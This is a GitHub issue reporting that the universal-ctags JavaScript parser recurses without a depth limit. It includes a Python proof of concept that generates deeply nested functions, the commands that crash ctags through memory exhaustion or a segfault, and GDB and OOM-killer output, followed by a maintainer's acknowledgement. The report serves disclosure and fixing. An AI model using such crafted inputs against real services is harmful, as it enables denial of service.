# JavaScript parser can crash or exhaust memory with deeply nested functions

- URL: https://github.com/universal-ctags/ctags/issues/4409
- Repo: universal-ctags/ctags (language: C)
- State: open; created 2026-03-31T13:20:20Z; status ok; passes main

## Issue body

reporter (NONE) · theteatoast · 2026-03-31T13:20:20Z · https://github.com/universal-ctags/ctags/issues/4409

## Description:

The JS parser (parsers/jscript.c) performs recursive descent parsing without any depth limits.

A crafted input with deeply nested function definitions can trigger:

- Stack exhaustion (segmentation fault)
- Memory exhaustion

## Proof of Concept:

Generate nested JavaScript file:

python3 -c 'f=open("poc.js","w");depth=100000
for i in range(depth): f.write(f"var f{i} = function() {{\n")
for i in range(depth): f.write("};\n")
f.close()'


## Steps to reproduce:

 1. Memory Exhaustion:

`ctags --language-force=JavaScript poc.js`

result: Killed

``` [5035590.873930] [1461105]     0 1461105     3522     1019      347      672         0    69632        0             0 sshd
[5035590.873936] [1461106]   105 1461106     3038      700      252      448         0    69632        0             0 sshd
[5035590.873942] oom-kill:constraint=CONSTRAINT_NONE,nodemask=(null),cpuset=/,mems_allowed=0,global_oom,task_memcg=/user.slice/user-1000.slice/session-10010.scope,task=ctags,pid=1461102,uid=1000
[5035590.873991] Out of memory: Killed process 1461102 (ctags) total-vm:10936548kB, anon-rss:7376128kB, file-rss:2304kB, shmem-rss:0kB, UID:1000 pgtables:21400kB oom_score_adj:0
```

2. Segmentation Fault:

`ulimit -s 1024`
`ctags --language-force=JavaScript poc.js`

result: Segmentation fault (core dumped)

<details>
  <summary>GDB</summary>

```
(gdb) run
Starting program: /usr/bin/ctags --language-force=JavaScript poc.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7aacbf2 in sysmalloc (av=0x7ffff7c03ac0 <main_arena>, nb=65552) at ./malloc/malloc.c:2709
warning: 2709   ./malloc/malloc.c: No such file or directory
(gdb) bt
#0  0x00007ffff7aacbf2 in sysmalloc (av=0x7ffff7c03ac0 <main_arena>, nb=65552) at ./malloc/malloc.c:2709
#1  _int_malloc (av=av@entry=0x7ffff7c03ac0 <main_arena>, bytes=bytes@entry=65537) at ./malloc/malloc.c:4481
#2  0x00007ffff7aad045 in _int_realloc (av=av@entry=0x7ffff7c03ac0 <main_arena>, oldp=oldp@entry=0x55556e849200,
    oldsize=oldsize@entry=48, nb=nb@entry=65552) at ./malloc/malloc.c:4975
#3  0x00007ffff7aae315 in __GI___libc_realloc (oldmem=0x55556e849210, bytes=65536) at ./malloc/malloc.c:3508
#4  0x000055555558c6eb in ?? ()
#5  0x000055555558de76 in ?? ()
#6  0x00005555555ced3a in ?? ()
#7  0x00005555555ce748 in ?? ()
#8  0x00005555555ceda6 in ?? ()
#9  0x00005555555ce748 in ?? ()
#10 0x00005555555ceda6 in ?? ()
#11 0x00005555555ce748 in ?? ()
#12 0x00005555555ceda6 in ?? ()
#13 0x00005555555ce748 in ?? ()
#14 0x00005555555ceda6 in ?? ()
#15 0x00005555555ce748 in ?? ()
#16 0x00005555555ceda6 in ?? ()
#17 0x00005555555ce748 in ?? ()
#18 0x00005555555ceda6 in ?? ()
#19 0x00005555555ce748 in ?? ()
#20 0x00005555555ceda6 in ?? ()
#21 0x00005555555ce748 in ?? ()
#22 0x00005555555ceda6 in ?? ()
#23 0x00005555555ce748 in ?? ()
#24 0x00005555555ceda6 in ?? ()
#25 0x00005555555ce748 in ?? ()
#26 0x00005555555ceda6 in ?? ()
#27 0x00005555555ce748 in ?? ()
--Type <RET> for more, q to quit, c to continue without paging--
```
</details>


## Tested on:

- Ubuntu 24.04.3 LTS
- Universal Ctags 5.9.0

## Suggested Fix:

- Introduce recursion depth limits
- Consider iterative parsing for deeply nested constructs





## Comment 4166561859

maintainer (MEMBER) · masatake · 2026-04-01T00:22:57Z · https://github.com/universal-ctags/ctags/issues/4409#issuecomment-4166561859

Thank you for reporting. I should apply the technique introduced to the V parser to the JavaScript parser, too.

## Comment 4166933784

maintainer (MEMBER) · masatake · 2026-04-01T02:07:07Z · https://github.com/universal-ctags/ctags/issues/4409#issuecomment-4166933784

See #4387.
